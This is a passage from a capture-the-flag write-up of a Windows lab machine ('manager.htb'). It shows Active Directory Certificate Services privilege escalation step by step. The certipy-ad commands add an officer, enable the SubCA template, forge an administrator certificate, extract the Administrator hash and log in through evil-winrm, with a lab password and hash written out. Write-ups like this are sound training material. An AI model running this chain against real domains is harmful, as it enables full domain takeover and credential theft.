                                      MANAGER\Domain Controllers    S-1-5-21-4078382237-1492182817-2568127209-516
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
                                      MANAGER\Enterprise Read-only Domain ControllersS-1-5-21-4078382237-1492182817-2568127209-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteOwner Principals       : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:08.5114963

```
{% endcode %}

If we try to use the template WebServer only because it has the flag `ENROLLEE_SUPPLIES_SUBJECT` enabled, we obtain the following error:

<figure><img src="../../.gitbook/assets/image (330).png" alt=""><figcaption></figcaption></figure>

**PKINIT (Public Key Cryptography for Initial Authentication)** is a protocol used in Kerberos authentication, allowing clients to authenticate to the Key Distribution Center (KDC) using X.509 certificates. For PKINIT client authentication to work, the client's certificate must have the appropriate Key Usage and Extended Key Usage extensions set. To resolve the issue we need to:

1. **Check Certificate Key Usage**: Ensure that the client certificate has the "Digital Signature" and "Key Encipherment" key usage extensions set. These extensions are typically required for certificates used in PKINIT authentication.
2. **Check Extended Key Usage (EKU)**: Verify that the "Client Authentication" EKU (OID 1.3.6.1.5.5.7.3.2) is included in the certificate's Extended Key Usage extension. This EKU indicates that the certificate is intended for client authentication purposes.

Find enabled certificate templates where `ENROLLEE_SUPPLIES_SUBJECT` is enabled:

```powershell
Certify.exe find /enrolleeSuppliesSubject
```

<figure><img src="../../.gitbook/assets/image (331).png" alt=""><figcaption></figcaption></figure>

Only the <mark style="color:blue;">**blue certificate template SubCA**</mark> is capable of `ClientAuthentication` because is NOT specified (\<null>) instead the WebServer template has `ServerAuthentication` so is not usable for privilege escalation in that case.

{% hint style="warning" %}
When the "pkiextendedkeyusage" (or Extended Key Usage) attribute is null or not present in a certificate, it means that there are no specific extended key usage purposes defined for that certificate. In such cases, the certificate <mark style="color:red;">**may still be usable for certain purposes, including client authentication**</mark>, depending on the configuration and policies of the systems involved.
{% endhint %}

Following our earlier find, we also came across a weakness in the SubCA template. To take advantage of this vulnerability, we utilized a tool called ‘certipy-ad.’

### Creating an Officer Account

An "Officer Account" in ADCS refers to a user or service account used to **manage** and **administer** the ADCS service in an Active Directory infrastructure. ADCS is a feature of Windows Server that allows for the creation, management, and deployment of digital certificates within an organization.

An Officer Account would typically have specific administrative privileges for managing certificates within the organization. These privileges might include the ability to:

* issue certificates,
* revoke certificates,&#x20;
* manage certificate requests,
* and other activities related to managing certificate-based security infrastructures.

I started by creating an ‘officer’ account with ‘certipy.ad.’ This was essential because it granted me the authority to manage certificates and related operations within the Active Directory. Without this ‘officer’ account, I wouldn’t have the necessary permissions to request and issue certificates or perform any certificate-related task.

{% code overflow="wrap" %}
```bash
certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (332).png" alt=""><figcaption></figcaption></figure>

### Enabling a Certificate Template and Requesting a Certificate

Next, I enabled a specific certificate template and requested a certificate with elevated privileges. By doing this, I essentially secured a certificate that would grant me additional access rights, a critical step in the privilege escalation process.

{% code overflow="wrap" %}
```bash
certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (333).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
certipy-ad req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn 'administrator@manager.htb'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

### Issuing the Requested Certificate

Once the certificate request was submitted, I needed it to be approved and issued.

{% code overflow="wrap" %}
```bash
certipy-ad ca -ca 'manager-DC01-CA' -issue-request <CHANGE-WITH-PREVIOUS-ISSUE-REQUEST-GENERATED> -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

### Retrieved the Issued Certificate

After the certificate was issued, I retrieved it.This allowed ‘raven’ to have the certificate locally and use it for authentication.

{% code overflow="wrap" %}
```bash
certipy-ad req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -retrieve <CHANGE-WITH-PREVIOUS-ISSUE-REQUEST-GENERATED>
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

### Authenticated with the obtained certificate

{% code overflow="wrap" %}
```bash
certipy-ad auth -pfx administrator.pfx -username administrator -domain manager.htb -dc-ip 10.10.11.236
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

However, during this process, I encountered an error related to clock skew. This error, known as `KRB_AP_ERR_SKEW` (Clock skew too great), occurs when there is a significant time difference between the local system and the remote server. In this case, the time skew was too substantial for the Kerberos authentication system to handle, resulting in the error. If you get this type of error, that means you need to sync your time.

To synchronize the system time with the ‘manager.htb’ server use the following command:

```bash
sudo ntpdate -u manager.htb
```

&#x20;if it didn’t work use:

```bash
timedatectl timedatectl set-ntp 0 && rdate -n 10.10.11.236
```

The server resets its settings automatically within a minute, so it’s important to have all the commands ready for quick execution. You can prepare a script or a set of commands that you can quickly copy and paste as needed:

{% code overflow="wrap" %}
```bash
user='raven@manager.htb'
password='R4v3nBe5tD3veloP3r!123'
ca='manager-DC01-CA'
```
{% endcode %}

```bash
certipy-ad ca -ca $ca -add-officer raven -username $user -password $password
```

```bash
certipy-ad ca -ca $ca -enable-template SubCA -username $user -password $password 
```

{% code overflow="wrap" %}
```bash
certipy-ad req -username $user -password $password -ca $ca -target manager.htb -template SubCA -upn 'administrator@manager.htb'
```
{% endcode %}

{% code overflow="wrap" %}
```bash
certipy-ad ca -ca $ca -username $user -password $password -issue-request <CHANGE-WITH-PREVIOUS-ISSUE-REQUEST-GENERATED> 
```
{% endcode %}

{% code overflow="wrap" %}
```bash
certipy-ad req -username $user -password $password -ca $ca -target manager.htb -retrieve <CHANGE-WITH-PREVIOUS-ISSUE-REQUEST-GENERATED>
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (338).png" alt=""><figcaption></figcaption></figure>

### Obtaining Administrator Hash

```bash
certipy-ad auth -pfx administrator.pfx  -dc-ip 10.10.11.236
```

<figure><img src="../../.gitbook/assets/image (339).png" alt=""><figcaption></figcaption></figure>

After successfully obtaining the Administrator hash, I used it to log in with elevated privileges. I utilized the hash as a password to connect to the system using `evil-winrm`. This allowed me to access the system as the administrator, granting me root-level privileges. As a result, I was able to easily retrieve the root flag:

{% code overflow="wrap" %}
```bash
evil-winrm  -i 10.10.11.236 -u administrator -H 'ae5064c2f62317332c88629e025924ef' 
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>
